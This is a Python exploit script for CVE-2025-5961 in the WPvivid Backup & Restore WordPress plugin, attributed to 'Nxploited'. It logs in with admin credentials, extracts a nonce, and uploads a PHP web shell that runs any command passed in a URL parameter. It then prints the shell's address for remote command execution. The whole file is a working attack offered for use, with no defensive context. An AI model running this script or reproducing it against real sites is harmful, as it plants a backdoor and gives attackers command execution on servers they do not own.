import argparse
import requests
import re
import time

# By : Khaled Alenazi (Nxploited)

requests.packages.urllib3.disable_warnings()

user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"


def check_version(session, url):
    print("[+] Checking plugin version...")
    readme_url = f"{url}/wp-content/plugins/wpvivid-backuprestore/readme.txt"
    try:
        r = session.get(readme_url, timeout=10)
        if r.status_code != 200:
            print("[!] Could not retrieve readme.txt. Proceeding anyway.")
            return
        m = re.search(r'Stable tag:\s*([\d\.]+)', r.text)
        if not m:
            print("[!] Could not find version in readme.txt. Proceeding anyway.")
            return
        version = m.group(1)
        print(f"[+] Detected plugin version: {version}")
        if version <= "0.9.116":
            print("[+] Target is vulnerable. Continuing exploit.")
        else:
            print("[!] Target version is newer. Attempting exploit anyway.")
    except Exception as e:
        print(f"[!] Exception while checking version: {e}. Proceeding anyway.")


def Nxploited(args):
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": user_agent})

    check_version(session, args.url)

    print(f"[+] Logging in to {args.url}...")
    login_url = f"{args.url}/wp-login.php"
    login_data = {
        'log': args.username,
        'pwd': args.password,
        'rememberme': 'forever',
        'wp-submit': 'Log+In'
    }

    r = session.post(login_url, data=login_data)
    if any('wordpress_logged_in' in c.name for c in session.cookies):
        print("[+] Logged in successfully.")
    else:
        print("[-] Failed to log in.")
        exit(1)

    print("[+] Fetching WPvivid page to extract nonce...")
    r = session.get(f"{args.url}/wp-admin/admin.php?page=wpvivid-export-import")
    m = re.search(r'ajax_nonce":"(\w+)"', r.text)
    if not m:
        print("[-] Failed to extract nonce. Proceeding anyway.")
        nonce = ""
    else:
        nonce = m.group(1)
        print(f"[+] Extracted nonce: {nonce}")

    shell_content = '<?php if(isset($_GET["cmd"])) { echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; } ?>'
    shell_bytes = shell_content.encode()

    print("[+] Uploading shell...")
    files = {
        "action": (None, "wpvivid_upload_import_files"),
        "_ajax_nonce": (None, nonce),
        "async-upload": ("shellnxploited.php", shell_bytes, "application/x-php"),
        "name": (None, "shellnxploited.php")
    }

    r = session.post(f"{args.url}/wp-admin/admin-ajax.php", files=files)

    if r.status_code == 200 and '"result":"success"' in r.text:
        print("[+] Exploit succeeded!")
        print(f"[+] Shell URL: {args.url}/wp-content/wpvividbackups/ImportandExport/shellnxploited.php?cmd=whoami")
        print("Exploit By: Khaled Alenazi (Nxploited) - https://github.com/Nxploited/")
    else:
        print("[-] Exploit failed but attempt was made.")

    time.sleep(3)


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-5961 Exploit by Khaled Alenazi (Nxploited)")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    parser.add_argument("-un", "--username", required=True, help="Admin username")
    parser.add_argument("-p", "--password", required=True, help="Admin password")
    args = parser.parse_args()
    Nxploited(args)


if __name__ == "__main__":
    main()
